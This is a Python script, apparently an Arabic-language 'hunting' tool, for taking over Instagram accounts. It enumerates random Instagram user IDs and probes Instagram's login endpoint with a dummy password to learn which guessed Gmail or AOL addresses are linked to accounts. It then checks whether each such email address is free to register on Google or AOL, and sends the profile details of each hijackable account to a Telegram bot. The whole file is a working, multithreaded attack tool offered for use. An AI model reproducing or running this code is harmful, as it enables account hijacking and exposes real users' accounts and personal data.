import random
import os
import sys
import time
import re
import string
import json
import secrets
import uuid
from threading import Thread, Lock
from datetime import datetime
import requests
import httpx
from bs4 import BeautifulSoup
from user_agent import generate_user_agent as gg
import colorama
from colorama import Fore, Back, Style

colorama.init(autoreset=True)

# ========== إعدادات زمن الإيقاف ==========
EXPIRE_DATETIME_STR = "2026:6:1:1:00:00"

def parse_expiry_string(exp_str):
    try:
        parts = exp_str.strip().split(':')
        if len(parts) != 6:
            raise ValueError
        year, month, day, hour, minute, second = map(int, parts)
        return datetime(year, month, day, hour, minute, second)
    except Exception:
        return None

EXPIRY_TIME = parse_expiry_string(EXPIRE_DATETIME_STR) if EXPIRE_DATETIME_STR != "0000:0:00:00:00" else None

def check_expiry():
    if EXPIRY_TIME is None:
        return
    now = datetime.now()
    if now > EXPIRY_TIME:
        print(f"\n{Fore.RED}{Back.BLACK}انتهى الوقت المحدد{Style.RESET_ALL}")
        sys.exit(1)

# ========== المتغيرات العامة ==========
total_generated = 0
instagram_taken_gmail = 0
instagram_not_taken_gmail = 0
instagram_taken_aol = 0
instagram_not_taken_aol = 0
google_available = 0
google_unavailable = 0
google_errors = 0
aol_checked = 0
aol_available = 0
aol_unavailable = 0
aol_errors = 0
valid_hits_gmail = 0
valid_hits_aol = 0
counters_lock = Lock()

def get_telegram_config():
    print(f"\n{Back.BLUE}{Fore.BLACK} اعدادات التليجرام {Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'─'*40}{Style.RESET_ALL}")
    bot_token = input(f"{Style.BRIGHT}ادخل التوكن: {Style.RESET_ALL}").strip()
    chat_id = input(f"{Style.BRIGHT}ادخل الايدي: {Style.RESET_ALL}").strip()
    return bot_token, chat_id

BOT_TOKEN, CHAT_ID = get_telegram_config()

GMAIL_DOMAIN = "@gmail.com"
AOL_DOMAIN = "@aol.com"
THREADS = 30

SPECIAL_PKS = [
    (5472526329, 2017),
    (8954893196, 2018),
    (12281416288, 2019),
    (31949007946, 2020),
    (49215362966, 2021),
    (51605812377, 2022),
]

def get_pk_range_for_year(year):
    if year == 2022:
        return None, None
    ranges = [
        (2010, 1, 1279000),
        (2011, 10000, 18957417),
        (2012, 18314009, 287924624),
        (2013, 1801651, 461365132),
        (2014, 361365132, 1682665388),
        (2015, 1682665388, 3382665388),
        (2016, 2682665388, 8682665388),
        (2017, 8682665388, 12000000000),
        (2018, 12000000000, 16000000000),
        (2019, 16000000000, 20000000000),
        (2020, 20000000000, 24000000000),
        (2021, 24000000000, 28000000000),
    ]
    for y, low, high in ranges:
        if y == year:
            return low, high
    return None, None

def generate_random_pk_for_year(year):
    if year == 2022:
        pk, actual_year = random.choice(SPECIAL_PKS)
        return pk, actual_year
    low, high = get_pk_range_for_year(year)
    if low is None or high is None:
        return None, None
    return random.randint(low, high), year

def generate_username_via_graphql(pk_id):
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'user-agent': gg(),
            'x-csrftoken': 'GXmNMinj7hQfdQoCv1sVETC1JkUGyvDe',
        }
        data = {
            'variables': json.dumps({
                "id": str(pk_id),
                "location_id": "",
                "shared_entity_id": "",
                "shid": "",
                "skip_location": True,
                "skip_sharer": True,
                "skip_user": False
            }),
            'doc_id': '23907016675582737',
        }
        response = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data, timeout=10)
        user = response.json()['data']['fetch__XDTUserDict']['username']
        return user
    except Exception:
        return None

def get_instagram_info(username):
    url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
    headers = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.instagram.com",
        "User-Agent": gg(),
        "X-IG-App-ID": "936619743392459",
        "X-Requested-With": "XMLHttpRequest"
    }
    try:
        with httpx.Client(http2=True, headers=headers, timeout=10.0) as session:
            response = session.get(url)
            data = response.json()
            user = data.get('data', {}).get('user', {})
            return {
                'full_name': user.get('full_name', 'N/A'),
                'username': user.get('username', 'N/A'),
                'user_id': user.get('id', 'N/A'),
                'biography': user.get('biography', 'N/A'),
                'followers': user.get('edge_followed_by', {}).get('count', 0),
                'following': user.get('edge_follow', {}).get('count', 0),
                'posts': user.get('edge_owner_to_timeline_media', {}).get('count', 0),
                'is_private': user.get('is_private', False),
                'is_verified': user.get('is_verified', False),
                'is_professional': user.get('is_professional_account', False),
                'category': user.get('category_name', 'N/A'),
                'email': user.get('business_email') or user.get('public_email') or 'N/A',
                'phone': user.get('business_phone_number') or user.get('public_phone_number') or 'N/A',
                'external_url': user.get('external_url', 'N/A'),
            }
    except Exception:
        return None

def insta_check_email(email):
    try:
        headers = {
            'User-Agent': 'Instagram 113.0.0.39.122 Android',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = {
            'username': email,
            'password': 'test_password_123',
            'device_id': str(uuid.uuid4()),
            'login_attempt_count': '0'
        }
        res = requests.post('https://i.instagram.com/api/v1/accounts/login/',
                            headers=headers, data=data, timeout=10)
        if 'bad_password' in res.text:
            return True
        else:
            return False
    except Exception:
        return None

def get_google_tokens():
    try:
        yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(random.choice(yy) for _ in range(random.randrange(6, 9)))
        n2 = ''.join(random.choice(yy) for _ in range(random.randrange(3, 9)))
        host = ''.join(random.choice(yy) for _ in range(random.randrange(15, 30)))
        
        headers = {"google-accounts-xsrf": "1", "user-agent": gg()}
        res = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&hl=en-GB', headers=headers, timeout=10)
        tok_search = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res.text)
        
        if not tok_search:
            return None, None
        tok = tok_search.group(2)
        
        validate_data = {
            'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies={'__Host-GAPS': host},
            headers=headers,
            data=validate_data,
            timeout=10
        )
        
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        new_host = response.cookies.get_dict().get('__Host-GAPS', host)
        return tl, new_host
    except Exception:
        return None, None

def google_check(username):
    tl, host = get_google_tokens()
    if not tl:
        return None
    
    try:
        headers = {
            'authority': 'accounts.google.com',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'user-agent': gg(),
        }
        data = f'f.req=%5B%22TL%3A{tl}%22%2C%22{username}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
        response = requests.post(
            f'https://accounts.google.com/_/signup/usernameavailability?TL={tl}',
            cookies={'__Host-GAPS': host},
            headers=headers,
            data=data,
            timeout=10
        )
        
        if '"gf.uar",1' in response.text:
            return True
        else:
            return False
    except:
        return None

def aol_check_availability(email):
    session = requests.Session()
    local_part = email.split('@')[0]
    try:
        agent = gg()
        req = session.get("https://login.aol.com/account/create", headers={'User-Agent': agent}, timeout=15)
        if req.status_code != 200:
            return None
        
        soup = BeautifulSoup(req.text, 'html.parser')
        crumb = soup.find("input", {"name": "crumb"}).get("value", "")
        acrumb = soup.find("input", {"name": "acrumb"}).get("value", "")
        sessionIndex = soup.find("input", {"name": "sessionIndex"}).get("value", "")
        asId = soup.find("input", {"name": "asId"}).get("value", "")
        
        if not crumb or not acrumb or not sessionIndex:
            return None
        
        first_names = ["Liam", "Olivia", "Noah", "Emma", "Ava", "Sophia", "James", "Isabella"]
        last_names = ["Johnson", "Brown", "Davis", "Miller", "Wilson", "Taylor", "Moore", "Collins"]
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*", k=12))
        
        payload = {
            'specId': "yidregsimplified",
            'context': "REGISTRATION",
            'crumb': crumb,
            'acrumb': acrumb,
            'sessionIndex': sessionIndex,
            'tos0': "oath_freereg|us|en-US",
            'asId': asId,
            'firstName': first_name,
            'lastName': last_name,
            'userid-domain': "aol",
            'userId': local_part,
            'password': password,
            'mm': str(random.randint(1, 12)),
            'dd': str(random.randint(1, 28)),
            'yyyy': str(random.randint(1990, 2002)),
            'signup': ""
        }
        
        headers_post = {
            'User-Agent': agent,
            'sec-ch-ua-platform': '"Android"',
            'x-requested-with': 'XMLHttpRequest',
            'sec-ch-ua-mobile': '?1',
            'origin': 'https://login.aol.com',
            'referer': 'https://login.aol.com/account/create',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7'
        }
        
        resp = session.post(
            "https://login.aol.com/account/module/create?validateField=userId",
            data=payload,
            headers=headers_post,
            timeout=15
        )
        
        if resp.status_code == 200 and '{"errors":[]}' in resp.text:
            return True
        else:
            return False
    except Exception:
        return None

# ================== دالة إرسال التيليجرام بالشكل المطلوب ==================
def send_to_telegram(email, source, insta_info, creation_year):
    if not insta_info:
        return
    
    year_str = str(creation_year) if creation_year else "Unknown"
    # تحديد نص المصدر
    source_text = "Gmail" if source == "Gmail" else "AOL"
    
    # تنسيق الرسالة كما هو مطلوب
    message = f"""حساب إنستغرام جديد 
━━━━━━━━━━━━━━━━━━━━━
الاسم: {insta_info['full_name']}
اليوزر: @{insta_info['username']}
البريد: {email} ({source_text})
تاريخ الإنشاء: {year_str}
المتابعين: {insta_info['followers']:,}
المتابعهم: {insta_info['following']:,}
البوستات: {insta_info['posts']}
البايو: {insta_info['biography'][:100]}
خاص: {'نعم' if insta_info['is_private'] else 'لا'}
موثق: {'نعم' if insta_info['is_verified'] else 'لا'}
━━━━━━━━━━━━━━━━━━━━━
تـم الـصـيـد بواسطة Ali Bssam
@DD36DD"""
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"  # لا يحتوي على HTML ولكن يترك للتوافق
    }
    try:
        requests.post(url, data=payload, timeout=5)
    except Exception:
        pass

# ================== واجهة الفحص (خانتين فقط) ==================
def status_display(selected_years):
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        
        with counters_lock:
            success = valid_hits_gmail + valid_hits_aol
            failure = total_generated - success
        
        print(f"{Fore.CYAN}{Style.BRIGHT}@DD36DD{Style.RESET_ALL}\n")
        print(f"{Fore.GREEN}{Style.BRIGHT}True : {success}{Style.RESET_ALL}")
        print(f"{Fore.RED}{Style.BRIGHT}X FAILURE : {failure}{Style.RESET_ALL}")
        
        time.sleep(1.5)

# ================== منطق العمال (بدون طباعة) ==================
def worker(selected_years):
    global total_generated, instagram_taken_gmail, instagram_not_taken_gmail
    global instagram_taken_aol, instagram_not_taken_aol
    global google_available, google_unavailable, google_errors
    global aol_checked, aol_available, aol_unavailable, aol_errors
    global valid_hits_gmail, valid_hits_aol
    
    while True:
        if EXPIRY_TIME and datetime.now() > EXPIRY_TIME:
            sys.exit(0)
        
        year = random.choice(selected_years)
        pk_id, actual_year = generate_random_pk_for_year(year)
        if pk_id is None:
            time.sleep(0.5)
            continue
        
        effective_year = actual_year if year == 2022 else year
        
        username = generate_username_via_graphql(pk_id)
        if not username or '_' in username:
            time.sleep(0.5)
            continue
        
        with counters_lock:
            total_generated += 1
        
        gmail_email = username + GMAIL_DOMAIN
        gmail_insta_status = insta_check_email(gmail_email)
        
        if gmail_insta_status is True:
            with counters_lock:
                instagram_taken_gmail += 1
            
            google_status = google_check(username)
            if google_status is True:
                with counters_lock:
                    google_available += 1
                insta_info = get_instagram_info(username)
                if insta_info:
                    send_to_telegram(gmail_email, "Gmail", insta_info, effective_year)
                    with counters_lock:
                        valid_hits_gmail += 1
                    with open("valid_gmail_accounts.txt", "a", encoding='utf-8') as f:
                        f.write(f"{gmail_email} | Year: {effective_year} | Username: {username}\n")
            elif google_status is False:
                with counters_lock:
                    google_unavailable += 1
            else:
                with counters_lock:
                    google_errors += 1
        
        elif gmail_insta_status is False:
            with counters_lock:
                instagram_not_taken_gmail += 1
            
            aol_email = username + AOL_DOMAIN
            aol_insta_status = insta_check_email(aol_email)
            
            if aol_insta_status is True:
                with counters_lock:
                    instagram_taken_aol += 1
                    aol_checked += 1
                
                aol_avail = aol_check_availability(aol_email)
                if aol_avail is True:
                    with counters_lock:
                        aol_available += 1
                    insta_info = get_instagram_info(username)
                    if insta_info:
                        send_to_telegram(aol_email, "AOL", insta_info, effective_year)
                        with counters_lock:
                            valid_hits_aol += 1
                        with open("valid_aol_accounts.txt", "a", encoding='utf-8') as f:
                            f.write(f"{aol_email} | Year: {effective_year} | Username: {username}\n")
                elif aol_avail is False:
                    with counters_lock:
                        aol_unavailable += 1
                else:
                    with counters_lock:
                        aol_errors += 1
            elif aol_insta_status is False:
                with counters_lock:
                    instagram_not_taken_aol += 1
            else:
                pass
        else:
            pass

def main():
    check_expiry()
    os.system('cls' if os.name == 'nt' else 'clear')
    
    year_options = {
        1: 2010, 2: 2011, 3: 2012, 4: 2013, 5: 2014,
        6: 2015, 7: 2016, 8: 2017, 9: 2018, 10: 2019,
        11: 2020, 12: 2021, 13: 2022
    }
    selected_years = list(year_options.values())
    
    status_thread = Thread(target=status_display, args=(selected_years,), daemon=True)
    status_thread.start()
    
    workers = []
    for _ in range(THREADS):
        t = Thread(target=worker, args=(selected_years,), daemon=True)
        t.start()
        workers.append(t)
    
    try:
        while True:
            time.sleep(1)
            if EXPIRY_TIME and datetime.now() > EXPIRY_TIME:
                sys.exit(0)
    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == "__main__":
    main()